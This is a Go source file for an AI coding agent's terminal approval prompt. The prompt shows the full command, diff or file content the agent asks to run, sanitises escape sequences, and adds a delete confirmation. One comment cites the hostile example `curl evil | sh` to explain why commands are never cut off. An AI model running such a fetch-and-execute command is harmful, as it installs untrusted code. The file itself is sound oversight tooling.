package chat

import (
	"fmt"
	"image/color"
	"maps"
	"slices"
	"strings"

	"charm.land/lipgloss/v2"
	"github.com/charmbracelet/x/ansi"

	"github.com/discorgento/ouija/internal/termsafe"
	"github.com/discorgento/ouija/internal/theme"
)

// ─── Approval option ──────────────────────────────────────────────────

// approvalOpt is one selectable option in the approval prompt.
type approvalOpt struct {
	key   string // single-key shortcut
	label string // display label
	color color.Color
	resp  approvalResponseMsg
}

// approvalOptions is the full set of actions for a tool approval prompt.
// Order matches the arrow-key navigation order. For delete_file, the first
// option becomes "Delete" (key: d) instead of "Yes" (key: y).
var approvalOptions = []approvalOpt{
	{key: "y", label: "Yes", color: theme.GreenDeep, resp: approvalResponseMsg{allowed: true}},
	{key: "n", label: "No", color: theme.RedDeep, resp: approvalResponseMsg{allowed: false, cancelled: false}},
	{key: "s", label: "Session", color: theme.Violet, resp: approvalResponseMsg{allowed: true, forSession: true}},
	{key: "e", label: "Edit", color: theme.Orange, resp: approvalResponseMsg{allowed: true}},
	{key: "esc", label: "Cancel", color: theme.Gray, resp: approvalResponseMsg{allowed: false}},
}

// deleteFileOptions replaces the "Yes" button with "Delete" (key: d, red)
// as an extra confirmation layer for destructive delete operations.
var deleteFileOptions = []approvalOpt{
	{key: "d", label: "Delete", color: theme.Red, resp: approvalResponseMsg{allowed: true}},
	{key: "n", label: "No", color: theme.RedDeep, resp: approvalResponseMsg{allowed: false, cancelled: false}},
	{key: "e", label: "Edit", color: theme.Orange, resp: approvalResponseMsg{allowed: true}},
	{key: "esc", label: "Cancel", color: theme.Gray, resp: approvalResponseMsg{allowed: false}},
}

// baseTool strips the composite session-key suffix ("tool\x00target") the
// engine appends to scope approvals per target, so the UI always reasons
// about the tool itself. Keys without a suffix pass through unchanged.
func baseTool(key string) string {
	if i := strings.IndexByte(key, 0); i >= 0 {
		return key[:i]
	}
	return key
}

// approvalOptionsFor returns the appropriate options set for the given tool.
func approvalOptionsFor(tool string) []approvalOpt {
	opts := approvalOptions
	if baseTool(tool) == "delete_file" {
		opts = deleteFileOptions
	}
	// Edit opens the proposed oldString → newString change in $EDITOR: only
	// edit_file has one; elsewhere the button did nothing.
	if baseTool(tool) != "edit_file" {
		opts = slices.DeleteFunc(slices.Clone(opts), func(o approvalOpt) bool { return o.key == "e" })
	}
	return opts
}

// renderApprovalBtn renders one selectable option in the approval prompt.
// Both selected and unselected have Padding(0,1) so buttons don't shift
// when navigating.
func renderApprovalBtn(opt approvalOpt, selected bool) string {
	content := fmt.Sprintf("● %s %s", opt.key, opt.label)
	if selected {
		return lipgloss.NewStyle().
			Bold(true).
			Foreground(theme.Bright).
			Background(opt.color).
			Padding(0, 1).
			Render(content)
	}
	return lipgloss.NewStyle().
		Foreground(opt.color).
		Background(theme.Shade).
		Padding(0, 1).
		Render("○ " + opt.key + " " + opt.label)
}

// ─── Tool display helpers ──────────────────────────────────────────────

// approvalToolIcon maps tool names to a descriptive symbol.
func approvalToolIcon(tool string) string {
	if strings.HasPrefix(tool, "escape:") {
		return "↗"
	}
	switch baseTool(tool) {
	case "bash":
		return "›"
	case "write_file", "edit_file":
		return "✎"
	case "delete_file":
		return "✗"
	case "read_file":
		return "◎"
	case "grep":
		return "§"
	case "glob":
		return "*"
	case "list_dir":
		return "≡"
	default:
		return "◆"
	}
}

// approvalToolColor returns a color for the tool label.
func approvalToolColor(tool string) color.Color {
	if strings.HasPrefix(tool, "escape:") {
		return theme.Orange
	}
	switch baseTool(tool) {
	case "bash":
		return theme.Red
	case "write_file", "edit_file", "delete_file":
		return theme.Amber
	case "read_file", "grep", "glob", "list_dir":
		return theme.Green
	default:
		return theme.Lavender
	}
}

// displayToolName strips the composite session key encoding for display.
func displayToolName(tool string) string {
	if strings.HasPrefix(tool, "escape:") {
		rest := strings.TrimPrefix(tool, "escape:")
		if idx := strings.IndexByte(rest, 0); idx >= 0 {
			return rest[:idx] + " (outside sandbox)"
		}
		return rest
	}
	return baseTool(tool)
}

// ─── Approval box rendering ────────────────────────────────────────────

// approvalTitle says in words what the tool call asks to do.
func approvalTitle(req *approvalRequestMsg) string {
	path, _ := req.input["path"].(string)
	path = termsafe.Clean(path)
	if strings.HasPrefix(req.tool, "escape:") {
		return "ouija wants to reach outside the project: " + displayToolName(req.tool)
	}
	verb := map[string]string{"write_file": "write", "edit_file": "edit", "delete_file": "delete"}[baseTool(req.tool)]
	switch {
	case baseTool(req.tool) == "bash":
		return "ouija wants to run a command"
	case verb != "" && path != "":
		return "ouija wants to " + verb + " " + fileLink(path, path)
	}
	return "ouija wants to use " + displayToolName(req.tool)
}

// RenderApprovalBox renders the approval prompt body at the given width: what
// the call asks in words, the command or diff it would run or apply, the
// other arguments, the option buttons and the keys. selectedIdx is the
// current arrow-key selection.
func RenderApprovalBox(req *approvalRequestMsg, toolCallN, selectedIdx, width int) string {
	toolColor := approvalToolColor(req.tool)
	inner := max(width-2, 20) // the body is indented by two

	var b strings.Builder
	line := func(s string) { b.WriteString("  " + s + "\n") }

	// ── What it asks, with the tool and call number on the right ───────
	title := lipgloss.NewStyle().Bold(true).Foreground(toolColor).Render(approvalToolIcon(req.tool) + " " + approvalTitle(req))
	tag := lipgloss.NewStyle().Foreground(theme.Muted).Render(fmt.Sprintf("%s · #%d", displayToolName(req.tool), toolCallN))
	if gap := inner - lipgloss.Width(title) - lipgloss.Width(tag); gap >= 2 {
		title += strings.Repeat(" ", gap) + tag
	} else {
		title = ansi.Truncate(title, inner, "…")
	}
	line(title)
	b.WriteByte('\n')

	// ── What would run or change ────────────────────────────────────
	skip := map[string]bool{}
	if p, ok := req.input["path"].(string); ok && p != "" {
		skip["path"] = true // in the title
	}
	command := ""
	if c, ok := req.input["command"].(string); ok && c != "" {
		skip["command"] = true
		command = termsafe.Clean(c)
		// The whole command, wrapped — never cut: what is approved must be
		// seen (a cut hid `…; curl evil | sh` behind a long first command).
		var wrapped []string
		for _, cl := range strings.Split(command, "\n") {
			wrapped = append(wrapped, strings.Split(ansi.Wrap(cl, inner-2, ""), "\n")...)
		}
		prompt := lipgloss.NewStyle().Bold(true).Foreground(toolColor).Render("$ ")
		cmdStyle := lipgloss.NewStyle().Bold(true).Foreground(theme.Text)
		for i, cl := range wrapped {
			if i == maxCommandLines {
				line(lipgloss.NewStyle().Foreground(theme.Amber).Render(fmt.Sprintf("⚠ %d more lines not shown — the command list below covers all of it", len(wrapped)-i)))
				break
			}
			line(prompt + cmdStyle.Render(cl))
			prompt = "  "
		}
		b.WriteByte('\n')
	} else if req.path != "" && req.path != baseTool(req.tool) && !skip["path"] {
		line(lipgloss.NewStyle().Foreground(theme.Silver).Render(ansi.Truncate(termsafe.Clean(req.path), inner, "…")))
	}

	// Preview from engine (diff for edit_file, summary for others). The model
	// wrote the command and the file holds the diff: an escape sequence in
	// either must not redraw the prompt itself.
	if s, ok := req.input["_preview"].(string); ok && s != "" {
		s = termsafe.Clean(s)
		if strings.HasPrefix(s, "  @@") {
			p, _ := req.input["path"].(string)
			for _, dl := range strings.Split(renderDiffBlock(p, s, inner), "\n") {
				line(dl)
			}
			skip["oldString"], skip["newString"] = true, true // the diff shows them
		} else {
			if command != "" {
				s = bashPreviewExtras(s, command) // the command itself is shown above
			}
			for _, pl := range strings.Split(s, "\n") {
				if pl = strings.TrimSpace(pl); pl != "" {
					style := lipgloss.NewStyle().Foreground(theme.Silver)
					if strings.Contains(pl, "⚠") {
						style = style.Foreground(theme.Amber)
					}
					line(style.Render(ansi.Truncate(pl, inner, "…")))
				}
			}
		}
		if strings.TrimSpace(s) != "" {
			b.WriteByte('\n')
		}
	}

	// A file to be written: its content, as it will be.
	if c, ok := req.input["content"].(string); ok && baseTool(req.tool) == "write_file" {
		p, _ := req.input["path"].(string)
		for _, fl := range strings.Split(renderFilePreview(p, termsafe.Clean(c), inner), "\n") {
			line(fl)
		}
		b.WriteByte('\n')
		skip["content"] = true
	}

	// Remaining arguments (not _prefixed meta-keys like _preview).
	shown := false
	for _, k := range slices.Sorted(maps.Keys(req.input)) {
		if strings.HasPrefix(k, "_") || skip[k] {
			continue
		}
		shown = true
		val := termsafe.Clean(fmt.Sprintf("%v", req.input[k]))
		val = strings.ReplaceAll(val, "\n", "⏎")
		line(lipgloss.NewStyle().Foreground(theme.Muted).Render(k+": ") +
			lipgloss.NewStyle().Foreground(theme.Silver).Render(ansi.Truncate(val, max(inner-len(k)-2, 8), "…")))
	}
	if shown {
		b.WriteByte('\n')
	}

	// ── Option buttons and keys ─────────────────────────────────────
	opts := approvalOptionsFor(req.tool)
	var btns strings.Builder
	for i, opt := range opts {
		if i > 0 {
			btns.WriteString("  ")
		}
		btns.WriteString(renderApprovalBtn(opt, i == selectedIdx))
	}
	line(btns.String())
	keys := make([]string, len(opts))
	for i, o := range opts {
		keys[i] = o.key
	}
	line(lipgloss.NewStyle().Italic(true).Foreground(theme.Muted).
		Render("← → choose · Enter confirm · " + strings.Join(keys, " / ")))
	return b.String()
}

// maxCommandLines is how many wrapped lines of a command the approval shows.
const maxCommandLines = 40

// bashPreviewExtras is the bash preview without its "will run: <command>"
// part, which the approval shows in full above it: what is left is the list
// of commands it runs, a denylist warning, the timeout.
func bashPreviewExtras(preview, command string) string {
	if rest, ok := strings.CutPrefix(preview, "will run: "+command); ok {
		preview = rest
	} else if _, rest, ok := strings.Cut(preview, "the command list covers all of it"); ok {
		preview = rest // a long command, cut in the preview
	}
	preview = strings.TrimSpace(preview)
	if list, rest, ok := strings.Cut(preview, "]"); ok && strings.HasPrefix(list, "[") {
		preview = "runs: " + strings.TrimPrefix(list, "[") + rest
	}
	return preview
}
